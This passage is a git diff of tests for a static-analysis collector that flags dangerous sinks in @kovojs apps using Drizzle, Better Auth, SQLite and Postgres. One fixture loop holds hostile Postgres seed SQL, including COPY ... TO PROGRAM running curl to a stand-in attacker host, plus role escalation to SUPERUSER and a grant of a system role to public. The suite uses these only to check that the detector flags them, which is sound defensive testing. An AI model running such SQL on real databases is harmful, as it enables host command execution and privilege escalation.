@@ -1454,6 +1454,39 @@ describe('@kovojs/drizzle dangerous-sink collector (KV424, conservative)', () =>
     `);
     expect(safe).toEqual([]);
 
+    const booleanSafe = sinksFor(`
+      import { and, eq, isNotNull } from 'drizzle-orm';
+      import { query } from '@kovojs/server';
+      const users = { id: {}, name: {} };
+      export const byId = query({ load() {
+        return { predicate: Boolean(and(eq(users.id, 'fixed'), isNotNull(users.name))) };
+      } });
+    `);
+    expect(booleanSafe).toEqual([]);
+
+    for (const source of [
+      `import { and as combine, eq, isNotNull } from 'drizzle-orm';
+       import { query } from '@kovojs/server';
+       const users = { id: {}, name: {} };
+       export const byId = query({ load() {
+         return { predicate: Boolean(combine(eq(users.id, 'fixed'), isNotNull(users.name))) };
+       } });`,
+      `import * as drizzle from 'drizzle-orm';
+       import { query } from '@kovojs/server';
+       const users = { id: {}, name: {} };
+       export const byId = query({ load() {
+         return { predicate: Boolean(drizzle.and(
+           drizzle.eq(users.id, 'fixed'), drizzle.isNotNull(users.name),
+         )) };
+       } });`,
+    ]) {
+      expect(sinksFor(source), source).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({ sink: 'request-handler.opaque-package-call' }),
+        ]),
+      );
+    }
+
     const unsafe = sinksFor(`
       import { query } from '@kovojs/server';
       query({ load(_input, { request }) {
@@ -2074,6 +2107,38 @@ describe('@kovojs/drizzle dangerous-sink collector (KV424, conservative)', () =>
       expect.arrayContaining([expect.objectContaining({ sink: 'child_process.execFileSync' })]),
     );
     expect(Date.now() - started).toBeLessThan(3_000);
+  });
+
+  it('keeps exact boot-setup memo verdicts scoped to one source-program analysis', () => {
+    const safe = () =>
+      sinksFor(`
+        import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+        import { createApp } from '@kovojs/server';
+        const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf' });
+        export default createApp({ csrf: appCsrf, routes: [] });
+      `);
+    const unsafe = () =>
+      sinksFor(`
+        import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+        import { mutation, publicAccess } from '@kovojs/server';
+        export const derivePerRequest = mutation({ access: publicAccess('fixture'), handler() {
+          return betterAuthCsrfFromEnvironment({ field: 'csrf' });
+        } });
+      `);
+    const assertUnsafe = (facts: ReturnType<typeof unsafe>) =>
+      expect(facts).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            sink: 'request-handler.opaque-source',
+            source: '<request-scoped-framework-setup>',
+          }),
+        ]),
+      );
+
+    expect(safe()).toEqual([]);
+    assertUnsafe(unsafe());
+    assertUnsafe(unsafe());
+    expect(safe()).toEqual([]);
   });
 
   it('classifies four hundred independent request roots without budget truncation', () => {
@@ -3263,6 +3328,1059 @@ describe('@kovojs/drizzle dangerous-sink collector (KV424, conservative)', () =>
     `);
 
     expect(facts).toEqual([]);
+  });
+
+  it('treats only inert logical-not as a non-mutating retained-config unary use', () => {
+    const source = (unary: string) => `
+      import { guards, query } from '@kovojs/server';
+      const access = [guards.authed()];
+      ${unary}access;
+      export const read = query({
+        access,
+        load() { return { ok: true }; },
+      });
+    `;
+    expect(sinksFor(source('!'))).toEqual([]);
+    for (const operator of ['+', '-', '~']) {
+      const facts = sinksFor(source(operator));
+      expect(facts, operator).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            sink: 'request-handler.opaque-source',
+            source: '<mutated-retained-config>',
+          }),
+        ]),
+      );
+    }
+  });
+
+  it('accepts only the pristine generated contacts query key as an optimistic computed key', () => {
+    const queryFile = {
+      fileName: 'queries.ts',
+      source: `
+        import { query } from '@kovojs/server';
+        export const contactsQuery = query({ load() { return { items: [] }; } });
+      `,
+    };
+    const mutationSource = (computedKey: string, setup = '') => `
+      import { mutation, publicAccess } from '@kovojs/server';
+      import { contactsQuery } from './queries.js';
+      ${setup}
+      export const addContact = mutation({
+        access: publicAccess('fixture'),
+        optimistic: {
+          [${computedKey}](draft, input) { draft.items.push(input); },
+        },
+        handler() { return { ok: true }; },
+      });
+    `;
+    expect(
+      sinksForFiles([
+        queryFile,
+        { fileName: 'mutations.ts', source: mutationSource('contactsQuery.key') },
+      ]),
+    ).toEqual([]);
+
+    for (const [computedKey, setup] of [
+      ['queryAlias.key', `const queryAlias = contactsQuery;`],
+      [`contactsQuery[key]`, `const key = 'key';`],
+      ['contactsQuery.key', `Object.defineProperty(contactsQuery, 'key', { value: 'attacker' });`],
+    ] as const) {
+      const facts = sinksForFiles([
+        queryFile,
+        { fileName: 'mutations.ts', source: mutationSource(computedKey, setup) },
+      ]);
+      if (setup.includes('Object.defineProperty')) {
+        expect(facts, `${setup}\n${computedKey}`).toEqual(
+          expect.arrayContaining([
+            expect.objectContaining({
+              sink: 'request-handler.opaque-protocol',
+              source: '<Object.defineProperty-target:contactsQuery>',
+            }),
+          ]),
+        );
+        continue;
+      }
+      expect(facts, `${setup}\n${computedKey}`).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            sink: 'request-handler.opaque-source',
+            source: '<opaque-retained-config-derivation>',
+          }),
+        ]),
+      );
+    }
+
+    const namespaceFacts = sinksForFiles([
+      queryFile,
+      {
+        fileName: 'mutations.ts',
+        source: mutationSource('queries.contactsQuery.key').replace(
+          `import { contactsQuery } from './queries.js';`,
+          `import * as queries from './queries.js';`,
+        ),
+      },
+    ]);
+    expect(namespaceFacts.length).toBeGreaterThan(0);
+  });
+
+  it('accepts only the exact pristine Better Auth CSRF environment derivation grammar', () => {
+    const exact = sinksFor(`
+      import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+      import { createApp } from '@kovojs/server';
+      const appCsrf = betterAuthCsrfFromEnvironment({
+        field: 'csrf',
+      });
+      export default createApp({ csrf: appCsrf, routes: [] });
+    `);
+    expect(exact).toEqual([]);
+
+    const variants = [
+      `import { betterAuthCsrfFromEnvironment as deriveCsrf } from '@kovojs/better-auth';
+       const appCsrf = deriveCsrf({ field: 'csrf', sessionId(request) { return request.id; } });`,
+      `import * as auth from '@kovojs/better-auth';
+       const appCsrf = auth.betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId(request) { return request.id; } });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       const appCsrf = betterAuthCsrfFromEnvironment({ ...{ field: 'csrf' }, sessionId(request) { return request.id; } });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       const key = 'field';
+       const appCsrf = betterAuthCsrfFromEnvironment({ [key]: 'csrf', sessionId(request) { return request.id; } });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       const appCsrf = betterAuthCsrfFromEnvironment({ field: dynamicField, sessionId(request) { return request.id; } });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', extra: true, sessionId(request) { return request.id; } });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', field: 'again', sessionId(request) { return request.id; } });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', get sessionId() { return request => request.id; } });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       Object.defineProperty(betterAuthCsrfFromEnvironment, 'call', { value() {} });
+       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId(request) { return request.id; } });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'other' });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId() { return 'global'; } });`,
+      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId(request) { return request.headers.get('x-user'); } });`,
+    ];
+    for (const source of variants) {
+      const facts = sinksFor(
+        `import { createApp } from '@kovojs/server';\n${source}\nexport default createApp({ csrf: appCsrf, routes: [] });`,
+      );
+      expect(facts.length, source).toBeGreaterThan(0);
+    }
+
+    for (const sessionId of [
+      `sessionId() { return 'global'; }`,
+      `sessionId(request) { return request.headers.get('x-user'); }`,
+    ]) {
+      const facts = sinksFor(`
+        import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+        import { createApp } from '@kovojs/server';
+        const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', ${sessionId} });
+        export default createApp({ csrf: appCsrf, routes: [] });
+      `);
+      expect(facts.length, sessionId).toBeGreaterThan(0);
+    }
+  });
+
+  it('accepts only exact Better Auth environment binding option records', () => {
+    const exactEnvironmentBindingFiles = [
+      {
+        fileName: 'schema.ts',
+        source: `
+          import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
+          export const user = sqliteTable('user', {
+            email: text('email').notNull(),
+            id: text('id').primaryKey(),
+            name: text('name').notNull(),
+          });
+          export const authSchema = { user };
+        `,
+      },
+      {
+        fileName: '_kovo/app-runtime-db.ts',
+        source: `
+          import { createBetterAuthSqliteBindingsFromEnvironment } from '@kovojs/better-auth';
+          import { createSqliteAppRuntime } from '@kovojs/server/sqlite';
+          import { authSchema, user } from '../schema.js';
+          const APP_TABLES = [user];
+          const APP_SEED = [];
+          const appDatabase = createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
+          const authSystemDb = appDatabase.systemDb({
+            operation: 'write', reason: 'auth', surface: 'fixture',
+          });
+          export const appRuntimeDbReady = appDatabase.ready;
+          export function createAppAuthBindings(options) {
+            return createBetterAuthSqliteBindingsFromEnvironment({
+              csrf: options.csrf,
+              mapSession: ({ session: authSession, user }) => ({
+                id: authSession.id,
+                user: { email: user.email, id: user.id, name: user.name },
+              }),
+              schema: authSchema,
+              signInAccess: options.signInAccess,
+              signOutAccess: options.signOutAccess,
+              systemDb: authSystemDb,
+            });
+          }
+        `,
+      },
+      {
+        fileName: 'app.tsx',
+        source: `
+          import { authed, betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+          import { createApp, publicAccess, s, session } from '@kovojs/server';
+          import { appRuntimeDbReady, createAppAuthBindings } from './_kovo/app-runtime-db.js';
+          const appCsrf = betterAuthCsrfFromEnvironment({
+            field: 'csrf',
+          });
+          const appAuthed = authed();
+          const bindings = createAppAuthBindings({
+            csrf: appCsrf,
+            signInAccess: publicAccess('fixture'),
+            signOutAccess: [appAuthed],
+          });
+          await appRuntimeDbReady;
+          await bindings.seedDemoUser();
+          const appSession = session(s.object({ id: s.string() }));
+          export default createApp({
+            routes: [],
+            sessionProvider: appSession.provider(bindings.sessionProvider),
+          });
+        `,
+      },
+    ];
+    const exact = sinksForFiles(exactEnvironmentBindingFiles);
+    expect(exact).toEqual([]);
+
+    const exactPostgresFiles = [
+      {
+        fileName: 'schema.ts',
+        source: `
+          import { pgTable, text } from 'drizzle-orm/pg-core';
+          export const user = pgTable('user', {
+            email: text('email').notNull(), id: text('id').primaryKey(), name: text('name').notNull(),
+          });
+          export const authSchema = { user };
+        `,
+      },
+      {
+        fileName: '_kovo/app-runtime-db-options.ts',
+        source: `
+          import { postgresAppRuntimeOptions, postgresSchemaModule } from '@kovojs/server';
+          import * as schema from '../schema.js';
+          export const appRuntimeSchema = postgresSchemaModule(schema);
+          const SEED_CONTACTS =
+            'INSERT INTO contacts (id, name, email, company) VALUES ' +
+            "('c1', 'Ada Lovelace', 'ada@example.com', 'Analytical Engines'), " +
+            "('c2', 'Grace Hopper', 'grace@example.com', 'Naval Systems'), " +
+            "('c3', 'Alan Turing', 'alan@example.com', 'Bletchley Park') " +
+            'ON CONFLICT (id) DO NOTHING;';
+          export const appRuntimeDbOptions = postgresAppRuntimeOptions({
+            schema: appRuntimeSchema,
+            seedSql: SEED_CONTACTS,
+          });
+        `,
+      },
+      {
+        fileName: '_kovo/app-runtime-db.ts',
+        source: `
+          import { createBetterAuthPostgresBindingsFromEnvironment } from '@kovojs/better-auth';
+          import { createPostgresAppRuntimeDb } from '@kovojs/server';
+          import { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';
+          const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);
+          const authSystemDb = appDatabase.systemDb({
+            operation: 'write', reason: 'auth', surface: 'fixture',
+          });
+          export const appRuntimeDbReady = appDatabase.ready;
+          export function createAppAuthBindings(options) {
+            return createBetterAuthPostgresBindingsFromEnvironment({
+              csrf: options.csrf,
+              mapSession: ({ session: authSession, user }) => ({
+                id: authSession.id,
+                user: { email: user.email, id: user.id, name: user.name },
+              }),
+              schema: appRuntimeSchema.authSchema,
+              signInAccess: options.signInAccess,
+              signOutAccess: options.signOutAccess,
+              systemDb: authSystemDb,
+            });
+          }
+          export const appRuntimeDbProvider = appDatabase.db;
+        `,
+      },
+      {
+        fileName: 'app.tsx',
+        source: `
+          import { authed, betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
+          import { createApp, publicAccess, s, session } from '@kovojs/server';
+          import {
+            appRuntimeDbProvider,
+            appRuntimeDbReady,
+            createAppAuthBindings,
+          } from './_kovo/app-runtime-db.js';
+          const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf' });
+          const appAuthed = authed();
+          const bindings = createAppAuthBindings({
+            csrf: appCsrf,
+            signInAccess: publicAccess('fixture'),
+            signOutAccess: [appAuthed],
+          });
+          await appRuntimeDbReady;
+          await bindings.seedDemoUser();
+          const appSession = session(s.object({ id: s.string() }));
+          export default createApp({
+            db: appRuntimeDbProvider,
+            routes: [],
+            sessionProvider: appSession.provider(bindings.sessionProvider),
+          });
+        `,
+      },
+    ];
+    const exactPostgres = sinksForFiles(exactPostgresFiles);
+    expect(exactPostgres).toEqual([]);
+
+    for (const [label, seedSequence] of [
+      ['export alias', `export const appSeedDemoUser = bindings.seedDemoUser;`],
+      [
+        'call before ready',
+        `await bindings.seedDemoUser();
+         await appRuntimeDbReady;`,
+      ],
+      [
+        'non-awaited call',
+        `await appRuntimeDbReady;
+         bindings.seedDemoUser();`,
+      ],
+      [
+        'stored promise',
+        `await appRuntimeDbReady;
+         const seedResult = bindings.seedDemoUser();
+         await seedResult;`,
+      ],
+      [
+        'then callback',
+        `await appRuntimeDbReady;
+         await bindings.seedDemoUser().then(() => undefined);`,
+      ],
+      [
+        'optional call',
+        `await appRuntimeDbReady;
+         await bindings.seedDemoUser?.();`,
+      ],
+      [
+        'helper wrapper',
+        `async function seedAtBoot() { await bindings.seedDemoUser(); }
+         await appRuntimeDbReady;
+         await seedAtBoot();`,
+      ],
+      [
+        'nested block',
+        `await appRuntimeDbReady;
+         { await bindings.seedDemoUser(); }`,
+      ],
+      [
+        'nested static block',
+        `await appRuntimeDbReady;
+         class SeedAtBoot { static { void bindings.seedDemoUser(); } }`,
+      ],
+      [
+        'callback capture',
+        `await appRuntimeDbReady;
+         await [undefined].map(() => bindings.seedDemoUser())[0];`,
+      ],
+      [
+        'destructured alias',
+        `const { seedDemoUser } = bindings;
+         await appRuntimeDbReady;
+         await seedDemoUser();`,
+      ],
+      [
+        'repeated call',
+        `await appRuntimeDbReady;
+         await bindings.seedDemoUser();
+         await appRuntimeDbReady;
+         await bindings.seedDemoUser();`,
+      ],
+    ] as const) {
+      const facts = sinksForFiles(
+        exactPostgresFiles.map((file) =>
+          file.fileName === 'app.tsx'
+            ? {
+                ...file,
+                source: file.source.replace(
+                  `await appRuntimeDbReady;
+          await bindings.seedDemoUser();`,
+                  seedSequence,
+                ),
+              }
+            : file,
+        ),
+      );
+      expect(
+        facts.some(
+          (fact) =>
+            fact.source?.includes('seedDemoUser') === true ||
+            fact.source?.includes('bindings') === true ||
+            fact.source === '<opaque-retained-config-derivation>',
+        ),
+        label,
+      ).toBe(true);
+    }
+
+    for (const hostileSeed of [
+      `COPY (SELECT current_user) TO PROGRAM 'curl https://attacker.invalid'`,
+      `CREATE FUNCTION steal() RETURNS void LANGUAGE plpgsql SECURITY DEFINER AS 'BEGIN END'`,
+      `CREATE EXTENSION file_fdw`,
+      `GRANT kovo_system TO public`,
+      `ALTER ROLE kovo_app WITH SUPERUSER`,
+    ]) {
+      const facts = sinksForFiles(
+        exactPostgresFiles.map((file) =>
+          file.fileName === '_kovo/app-runtime-db-options.ts'
+            ? {
+                ...file,
+                source: file.source.replace(
+                  /const SEED_CONTACTS =[\s\S]*?;\n          export const appRuntimeDbOptions/u,
+                  `const SEED_CONTACTS = ${JSON.stringify(hostileSeed)};\n          export const appRuntimeDbOptions`,
+                ),
+              }
+            : file,
+        ),
+      );
+      expect(facts, hostileSeed).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            sink: 'request-handler.opaque-call',
+            source: 'createPostgresAppRuntimeDb',
+          }),
+        ]),
+      );
+    }
+
+    // SPEC.md §6.6: exact AST provenance must be lost when generated Postgres options or their
+    // nested Drizzle schema cross an unreviewed carrier before createPostgresAppRuntimeDb.
+    for (const [label, escape] of [
+      [
+        'object holder',
+        `const escaped = { value: appRuntimeSchema };
+         escaped.value.authSchema.user = undefined;`,
+      ],
+      [
+        'array holder',
+        `const escaped = [appRuntimeDbOptions];
+         escaped[0].schema.authSchema.user = undefined;`,
+      ],
+      [
+        'getter return',
+        `class Holder { get value() { return appRuntimeSchema; } }
+         new Holder().value.authSchema.user = undefined;`,
+      ],
+      [
+        'generator return',
+        `function* values() { yield appRuntimeDbOptions; }
+         values().next().value.schema.authSchema.user = undefined;`,
+      ],
+      [
+        'helper return',
+        `function getOptions() { return appRuntimeDbOptions; }
+         getOptions().schema.authSchema.user = undefined;`,
+      ],
+      [
+        'callback capture',
+        `const escaped = [appRuntimeSchema].map((value) => value)[0];
+         escaped.authSchema.user = undefined;`,
+      ],
+      [
+        'static class field',
+        `class Holder { static value = appRuntimeSchema; }
+         Holder.value.authSchema.user = undefined;`,
+      ],
+      [
+        'instance class field',
+        `class Holder { value = appRuntimeDbOptions; }
+         new Holder().value.schema.authSchema.user = undefined;`,
+      ],
+      [
+        'constructor argument',
+        `class Box { constructor(value) { this.value = value; } }
+         const escaped = new Box(appRuntimeSchema);
+         escaped.value.authSchema.user = undefined;`,
+      ],
+    ] as const) {
+      const facts = sinksForFiles(
+        exactPostgresFiles.map((file) =>
+          file.fileName === '_kovo/app-runtime-db.ts'
+            ? {
+                ...file,
+                source: file.source.replace(
+                  `const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
+                  `${escape}
+                   const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
+                ),
+              }
+            : file,
+        ),
+      );
+      expect(facts, label).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            sink: 'request-handler.opaque-call',
+            source: 'createPostgresAppRuntimeDb',
+          }),
+        ]),
+      );
+    }
+
+    const exportedSchemaCarrier = sinksForFiles(
+      exactPostgresFiles.map((file) => {
+        if (file.fileName === '_kovo/app-runtime-db-options.ts') {
+          return { ...file, source: `${file.source}\nexport default appRuntimeSchema;` };
+        }
+        if (file.fileName === '_kovo/app-runtime-db.ts') {
+          return {
+            ...file,
+            source: file.source
+              .replace(
+                `import { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';`,
+                `import escapedSchema, { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';`,
+              )
+              .replace(
+                `const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
+                `escapedSchema.authSchema.user = undefined;
+                 const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
+              ),
+          };
+        }
+        return file;
+      }),
+    );
+    expect(exportedSchemaCarrier).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          sink: 'request-handler.opaque-call',
+          source: 'createPostgresAppRuntimeDb',
+        }),
+      ]),
+    );
+
+    const jsxSchemaCarrier = sinksForFiles([
+      ...exactPostgresFiles.map((file) =>
+        file.fileName === '_kovo/app-runtime-db.ts'
+          ? {
+              ...file,
+              source: file.source
+                .replace(
+                  `import { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';`,
+                  `import { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';
+                   import { escapedSchema } from './schema-carrier.js';`,
+                )
+                .replace(
+                  `const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
+                  `escapedSchema.props.value.authSchema.user = undefined;
+                   const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
+                ),
+            }
+          : file,
+      ),
+      {
+        fileName: '_kovo/schema-carrier.tsx',
+        source: `
+          import { appRuntimeSchema } from './app-runtime-db-options.js';
+          function Carrier(props) { return props.value; }
+          export const escapedSchema = <Carrier value={appRuntimeSchema} />;
+        `,
+      },
+    ]);
+    expect(jsxSchemaCarrier).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          sink: 'request-handler.opaque-call',
+          source: 'createPostgresAppRuntimeDb',
+        }),
+      ]),
+    );
+
+    const requestDerivedFactoryOptions = sinksForFiles([
+      ...exactEnvironmentBindingFiles.filter(({ fileName }) => fileName !== 'app.tsx'),
+      {
+        fileName: 'unsafe.ts',
+        source: `
+          import { mutation, publicAccess } from '@kovojs/server';
+          import { createAppAuthBindings } from './_kovo/app-runtime-db.js';
+          export const unsafe = mutation({
+            access: publicAccess('fixture'),
+            handler(input) {
+              const bindings = createAppAuthBindings({
+                csrf: input.csrf,
+                signInAccess: input.signInAccess,
+                signOutAccess: input.signOutAccess,
+              });
+              return bindings.sessionProvider;
+            },
+          });
+        `,
+      },
+    ]);
+    expect(requestDerivedFactoryOptions).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          sink: 'request-handler.opaque-source',
+          source: '<request-scoped-framework-setup>',
+        }),
+      ]),
+    );
+
+    const requestScopedStaticSetup = sinksForFiles(
+      exactEnvironmentBindingFiles.map((file) =>
+        file.fileName === 'app.tsx'
+          ? {
+              ...file,
+              source: file.source
+                .replace(
+                  `createApp, publicAccess, s, session`,
+                  `createApp, mutation, publicAccess, s, session`,
+                )
+                .replace(
+                  `export default createApp({`,
+                  `export const unsafeSeed = mutation({
+                    access: publicAccess('fixture'),
+                    handler() { return bindings.seedDemoUser(); },
+                  });
+                  export const unsafeBindings = mutation({
+                    access: publicAccess('fixture'),
+                    handler() {
+                      return createAppAuthBindings({
+                        csrf: appCsrf,
+                        signInAccess: publicAccess('fixture'),
+                        signOutAccess: [appAuthed],
+                      });
+                    },
+                  });
+                  export default createApp({`,
+                ),
+            }
+          : file,
+      ),
+    );
+    expect(
+      requestScopedStaticSetup.filter(({ source }) => source === '<request-scoped-framework-setup>')
+        .length,
+      JSON.stringify(requestScopedStaticSetup),
+    ).toBeGreaterThanOrEqual(1);
+    expect(requestScopedStaticSetup).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          sink: 'request-handler.opaque-call',
+          source: 'bindings.seedDemoUser',
+        }),
+      ]),
+    );
+
+    for (const [label, mutateApp] of [
+      [
+        'wrong csrf origin',
+        (source: string) =>
+          source.replace(
+            `const appCsrf = betterAuthCsrfFromEnvironment({\n            field: 'csrf',\n          });`,
+            `const appCsrf = { field: 'csrf' };`,
+          ),
+      ],
+      [
+        'aliased csrf binding',
+        (source: string) =>
+          source
+            .replace(
+              `const appAuthed = authed();`,
+              `const csrfAlias = appCsrf;\n          const appAuthed = authed();`,
+            )
+            .replace(`csrf: appCsrf,`, `csrf: csrfAlias,`),
+      ],
+      [
+        'wrong authed origin',
+        (source: string) => source.replace(`const appAuthed = authed();`, `const appAuthed = {};`),
+      ],
+      [
+        'aliased authed binding',
+        (source: string) =>
+          source
+            .replace(
+              `const appAuthed = authed();`,
+              `const appAuthed = authed();\n          const authedAlias = appAuthed;`,
+            )
+            .replace(`signOutAccess: [appAuthed],`, `signOutAccess: [authedAlias],`),
+      ],
+    ] as const) {
+      const facts = sinksForFiles(
+        exactEnvironmentBindingFiles.map((file) =>
+          file.fileName === 'app.tsx' ? { ...file, source: mutateApp(file.source) } : file,
+        ),
+      );
+      expect(facts.length, label).toBeGreaterThan(0);
+    }
+
+    for (const setup of [
+      `import { createBetterAuthPostgresBindingsFromEnvironment as construct } from '@kovojs/better-auth';`,
+      `import * as auth from '@kovojs/better-auth'; const construct = auth.createBetterAuthPostgresBindingsFromEnvironment;`,
+    ]) {
+      const facts = sinksFor(`
+        ${setup}
+        import { createApp } from '@kovojs/server';
+        const bindings = construct({
+          csrf: {}, mapSession: value => value, schema: {},
+          signInAccess: {}, signOutAccess: {}, systemDb: {},
+        });
+        export default createApp({ routes: [], sessionProvider: bindings.sessionProvider });
+      `);
+      expect(facts.length, setup).toBeGreaterThan(0);
+    }
+
+    for (const [unsafeName, exactLine, unsafeLine] of [
+      ['csrf', `csrf: options.csrf,`, `csrf: {},`],
+      ['schema', `schema: authSchema,`, `schema: {},`],
+      ['signInAccess', `signInAccess: options.signInAccess,`, `signInAccess: {},`],
+      ['signOutAccess', `signOutAccess: options.signOutAccess,`, `signOutAccess: [],`],
+      ['systemDb', `systemDb: authSystemDb,`, `systemDb: {},`],
+    ] as const) {
+      const files = exactEnvironmentBindingFiles.map((file) =>
+        file.fileName === '_kovo/app-runtime-db.ts'
+          ? { ...file, source: file.source.replace(exactLine, unsafeLine) }
+          : file,
+      );
+      const facts = sinksForFiles(files);
+      expect(facts, `${unsafeName}: ${unsafeLine}`).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            sink: 'request-handler.opaque-call',
+            source: 'createBetterAuthSqliteBindingsFromEnvironment',
+          }),
+        ]),
+      );
+    }
+
+    const wrapperSideEffect = sinksForFiles(
+      exactEnvironmentBindingFiles.map((file) =>
+        file.fileName === 'app.tsx'
+          ? {
+              ...file,
+              source: file.source
+                .replace(
+                  `import { createApp, publicAccess, s, session } from '@kovojs/server';`,
+                  `import { createApp, publicAccess, s, session } from '@kovojs/server';\n          import { execFileSync } from 'node:child_process';`,
+                )
+                .replace(
+                  `const bindings = createAppAuthBindings({`,
+                  `function makeBindings() {\n            execFileSync('binding-wrapper');\n            return createAppAuthBindings({`,
+                )
+                .replace(
+                  `signOutAccess: [appAuthed],\n          });`,
+                  `signOutAccess: [appAuthed],\n            });\n          }`,
+                )
+                .replace(
+                  `appSession.provider(bindings.sessionProvider)`,
+                  `appSession.provider(makeBindings().sessionProvider)`,
+                ),
+            }
+          : file,
+      ),
+    );
+    expect(wrapperSideEffect).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          sink: 'request-handler.opaque-source',
+          source: '<opaque-retained-config-derivation>',
+        }),
+      ]),
+    );
+  });
+
+  it('accepts only the exact declarative SQLite app runtime constructor grammar', () => {
+    const source = (constructor: string, options: string, mutation = '') => `
+      import { createApp } from '@kovojs/server';
+      ${constructor}
+      import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
+      const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
+      const APP_TABLES = [contacts];
+      const APP_SEED = [{ table: contacts, rows: [{ id: 'c1' }] }];
+      ${mutation}
+      const runtime = createSqliteAppRuntime(${options});
+      runtime.systemDb({ operation: 'write', reason: 'auth', surface: 'test' });
+      export default createApp({ db: runtime.db, routes: [] });
+    `;
+    const directImport = `import { createSqliteAppRuntime } from '@kovojs/server/sqlite';`;
+    expect(
+      sinksForFiles([
+        {
+          fileName: 'schema.ts',
+          source: `
+            import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
+            export const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
+          `,
+        },
+        {
+          fileName: '_kovo/app-runtime-db.ts',
+          source: `
+            ${directImport}
+            import * as schema from '../schema.js';
+            const APP_TABLES = [schema.contacts];
+            const APP_SEED = [{ table: schema.contacts, rows: [{ id: 'c1' }] }];
+            const runtime = createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
+            runtime.systemDb({ operation: 'write', reason: 'auth', surface: 'test' });
+            export const appRuntimeDbProvider = runtime.db;
+            export const appRuntimeMutationReplayStore = runtime.mutationReplayStore;
+          `,
+        },
+        {
+          fileName: 'app.tsx',
+          source: `
+            import { createApp, createMemoryVersionedClientModuleRegistry } from '@kovojs/server';
+            import {
+              appRuntimeDbProvider,
+              appRuntimeMutationReplayStore,
+            } from './_kovo/app-runtime-db.js';
+            const clientModules = createMemoryVersionedClientModuleRegistry();
+            const mutationReplayStore = appRuntimeMutationReplayStore;
+            export default createApp({
+              clientModules,
+              db: appRuntimeDbProvider,
+              mutationReplayStore,
+              routes: [],
+            });
+          `,
+        },
+        {
+          fileName: 'queries.ts',
+          source: `
+            import { query } from '@kovojs/server';
+            import { contacts } from './schema.js';
+            interface AppQueryLoadContext { db?: unknown }
+            export const contactsQuery = query({
+              async load(_input: unknown, context: AppQueryLoadContext) {
+                if (!context.db) throw new Error('missing db');
+                return await context.db.select({ id: contacts.id }).from(contacts).orderBy(contacts.id);
+              },
+            });
+          `,
+        },
+      ]),
+    ).toEqual([]);
+
+    for (const [constructor, options, mutation] of [
+      [
+        `import { createSqliteAppRuntime as make } from '@kovojs/server/sqlite'; const createSqliteAppRuntime = make;`,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        '',
+      ],
+      [
+        `import * as sqlite from '@kovojs/server/sqlite'; const createSqliteAppRuntime = sqlite.createSqliteAppRuntime;`,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        '',
+      ],
+      [directImport, '{ ...{ seed: APP_SEED }, tables: APP_TABLES }', ''],
+      [directImport, `{ ['seed']: APP_SEED, tables: APP_TABLES }`, ''],
+      [directImport, '{ seed: APP_SEED, tables: APP_TABLES, extra: true }', ''],
